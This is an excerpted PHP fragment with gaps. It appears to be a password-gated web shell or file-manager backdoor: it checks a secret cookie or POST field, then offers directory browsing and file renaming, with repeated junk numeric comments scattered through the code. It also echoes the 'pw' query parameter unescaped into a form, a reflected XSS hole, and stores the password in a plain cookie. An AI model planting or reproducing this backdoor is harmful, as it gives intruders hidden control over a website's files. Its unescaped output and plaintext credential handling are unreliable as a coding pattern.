...
$pass = false;
if (isset($_COOKIE['pw_name_35291'])) {
    if(($_COOKIE['pw_name_35291']) == $auth_key) {
        $pass = true;
    }
} else {
    if (isset($_POST['pw_name_35291'])) {
        if(($_POST['pw_name_35291']) == $auth_key) {
            setcookie("pw_name_35291", $_POST['pw_name_35291']);
            $pass = true;
        }
    }
}
if (!$pass) {
    die("<form action='?p=' method=post ><input type=password name='pw_name_35291' value='".$_GET['pw']."'  required><input type=submit name='watching' ></form>");
}
// ---- // 1704796894508691 1704796894404931 1704796894789938 1704796894686633
echo <<<HEAD
<!DOCTYPE html>
<html lang="en">
<head>
...
HEAD;// 1704796894508691 1704796894404931 1704796894789938 1704796894686633
...
foreach ($paths as $id => $dir_part) {
    ...
    if ($dir_part == '')
        continue;// 1704796894508691 1704796894404931 1704796894789938 1704796894686633
    echo "<a href='?p=";
    for ($i = 0; $i <= $id; $i++) {
...
if (isset($_GET['r'])) {
    ...
    <form method="post">
        ...
        if (isset($_POST['rename'])) {// 1704796894508691 1704796894404931 1704796894789938 1704796894686633
            $name = PATH . "/" . $_GET['r'];
